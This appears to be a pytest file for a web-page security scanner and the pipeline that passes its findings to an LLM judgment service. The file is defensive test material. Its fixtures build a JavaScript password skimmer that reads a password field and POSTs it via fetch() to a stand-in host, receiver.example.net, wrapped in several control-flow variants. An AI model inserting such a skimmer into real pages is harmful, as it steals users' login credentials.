"""Goal counterexamples: distinguish behavior before judging and bound failures."""
import io,json
from copy import deepcopy
import pytest
from L3_SCANNER import L3Scanner
from L3_SCANNER.policies import operational_detection_policy
from evidence_pipeline import build_record,build_context
from evidence_pipeline.gateway import OpenAICompatibleGateway,JudgmentServiceError
from evidence_pipeline.context_inventory import restore,present
from evidence_pipeline.context_tables import present as tabulate
from evidence_pipeline.model_context import validate_model_context

READ='var p=document.getElementById("pw").value;'
SEND='fetch("https://receiver.example.net/",{method:"POST",body:p});'

def build(code):
    native=L3Scanner(operational_detection_policy()).scan_content({'original_url':'https://example.com/login',
        'html':{'content':'<input id="pw" name="password" type="password"><script>'+code+'</script>'}})
    record=build_record('l3',native,request_id='fixture',attempt=1)
    return native,build_context([record],{'l3':native['raw']})

def events(context):return [x['facts'] for x in restore(context)['evidence'] if x['kind']=='event' and x['facts'].get('event_kind')=='network_requests']

def test_distinct_control_and_function_programs_stay_distinct_on_wire():
    codes=[READ+SEND,READ+'if(false){'+SEND+'}',READ+'function unused(){'+SEND+'}',READ+'function called(){'+SEND+'}called();']
    views=[]
    for code in codes:
        native,context=build(code);validate_model_context(context)
        assert native['raw']['javascript']['network_requests']
        bodies=[]
        def opener(request,**kw):
            bodies.append(json.loads(request.data));return io.BytesIO(b'{"choices":[{"finish_reason":"stop","message":{"content":"{}"}}]}')
        gateway=OpenAICompatibleGateway('http://127.0.0.1:8000','fixture','fixture',opener=opener)
        gateway('same system',json.dumps(context,ensure_ascii=False,separators=(',',':')))
        supplied=json.loads(bodies[0]['messages'][1]['content']);views.append(supplied)
        assert code in bodies[0]['messages'][1]['content'].replace('\\"','"')
        assert all(e['execution_observed'] is False for e in events(supplied))
    assert len({json.dumps(v,sort_keys=True) for v in views})==4
    assert events(views[1])[0]['control_context'][0]['path_state']=='literal_excludes_arm'
    assert events(views[2])[0]['call_context'][0].startswith('declaration-')
    assert {e['call_context'][0].split('-')[0] for e in events(views[3])}=={'declaration','call'}

@pytest.mark.parametrize('statement,state',[
    ('if(true){'+SEND+'}','literal_allows_arm'),
    ('if(true){}else{'+SEND+'}','literal_excludes_arm'),
    ('if(window.ready){'+SEND+'}','not_evaluated'),
])
def test_condition_changed_holdouts_keep_the_actual_condition(statement,state):
    native,context=build(READ+statement)
    assert events(context)[0]['control_context'][0]['path_state']==state
    if state=='not_evaluated':assert native['raw']['javascript']['analysis']['semantic_complete'] is False

def test_source_prefix_omission_is_explicit_and_never_claims_full_code():
    native,c=build('/*'+'x'*4500+'*/'+READ+SEND)
    restored=restore(c)
    script=next(x['facts'] for x in restored['evidence'] if x['kind']=='script')
    assert script['source_selection']['complete_supplied_source'] is False
    assert any(x.get('part')=='script_source' for x in restored['observation_omissions'])
    assert events(c)[0]['source_excerpt'] in SEND

def test_named_columns_preserve_distinct_types_missing_and_nested_metadata():
    rows=[{'id':f'E{i+1}','kind':'field','facts':{'a':v,'metadata':{'$literal':4,'request_id':'page data'},'x':{'common':'a long common description','v':i}}}
          for i,v in enumerate([False,0,None,[],{},'',True,1]*4)]
    rows.append({'id':'E33','kind':'field','facts':{'other':'a is absent'}})
    view={'evidence':rows};original=deepcopy(view);packed=tabulate(view)
    assert view==original and 'evidence_table_encoding' in packed
    assert json.dumps(restore(packed),sort_keys=True)==json.dumps(original,sort_keys=True)
    malformed=deepcopy(packed);malformed['evidence'][0]['positions'][0]=999
    with pytest.raises(ValueError,match='position'):restore(malformed)

def test_already_packed_overflow_is_a_context_limit_not_reserved_field_failure():
    source={'evidence':[{'id':f'E{i+1}','kind':'field','facts':{'name':'Repeated descriptive field name','index':i}} for i in range(80)]}
    packed=present(source);assert 'inventory_encoding_v2' in packed
    calls=[]
    def opener(request,**kw):
        calls.append(request.full_url)
        return io.BytesIO(b'{"count":106538}')
    g=OpenAICompatibleGateway('http://127.0.0.1:8000','fixture','fixture',max_context_tokens=49152,opener=opener)
    with pytest.raises(JudgmentServiceError) as error:g.prepare_context('same',packed)
    assert error.value.detail['kind']=='context_window_exceeded'
    assert len(calls)==1 and calls[0].endswith('/tokenize')
    assert g.last_budget_check['judgment_request_attempted'] is False

@pytest.mark.parametrize('values',[[False,0],[True,1],[0,0.0]])
@pytest.mark.parametrize('mixed',[False,True])
def test_inventory_never_merges_json_types(values,mixed):
    source={'resources':[{'value':values[i%2],'description':'A repeated resource description'} for i in range(40)]}
    if mixed:source['resources'].append({'different':'missing value remains absent'})
    packed=present(source)
    assert 'inventory_encoding_v2' in packed
    assert json.dumps(restore(packed),sort_keys=True)==json.dumps(source,sort_keys=True)

def test_inventory_preserves_encoding_like_data_inside_nested_packed_rows():
    metadata={'$literal':0,'nested':{'$inventory_table':2},'$verbatim':{'$url_prefix':0,'suffix':'x'}}
    source={'evidence':[{'resources':[{'label':'A long repeated label for resource','metadata':metadata,'index':i} for i in range(30)],'position':j} for j in range(15)]}
    packed=present(source)
    assert 'inventory_encoding_v2' in packed
    assert json.dumps(restore(packed),sort_keys=True)==json.dumps(source,sort_keys=True)

def test_unencoded_source_table_marker_is_never_interpreted_beside_real_inventory():
    marker={'$inventory_table':2,'columns':['x'],'shared':{},'rows':[[1]]}
    source={'resources':[{'name':'long repeated resource name','index':i} for i in range(20)],
        'declared_metadata':{'resources':marker,'evidence':{'$verbatim':{'source':True}}}}
    packed=present(source)
    assert 'inventory_encoding_v2' in packed
    assert json.dumps(restore(packed),sort_keys=True)==json.dumps(source,sort_keys=True)

@pytest.mark.parametrize('key',['$literal','$verbatim'])
def test_reserved_parent_keeps_nested_source_inventories_literal(key):
    nested=[{'description':'A repeated nested resource description','index':i} for i in range(20)]
    marker={key:0,'resources':nested} if key=='$literal' else {key:{'resources':nested}}
    source={'evidence':[{'metadata':marker,'index':i} for i in range(15)]}
    packed=present(source)
    assert json.dumps(restore(packed),sort_keys=True)==json.dumps(source,sort_keys=True)

@pytest.mark.parametrize('body,expected',[
    ('while(false){'+SEND+'}','literal_excludes_body'),
    ('function f(){return;'+SEND+'}f();','after_direct_exit_in_same_block'),
])
def test_long_source_retains_loop_or_exit_limit_on_the_network_event(body,expected):
    code='/*'+'x'*4096+'*/'+READ+body
    native,view=build(code)
    assert native['raw']['javascript']['analysis']['semantic_complete'] is False
    assert all(any(x['path_state']==expected for x in event['control_context']) for event in events(view))
    assert restore(view)['observation_omissions']
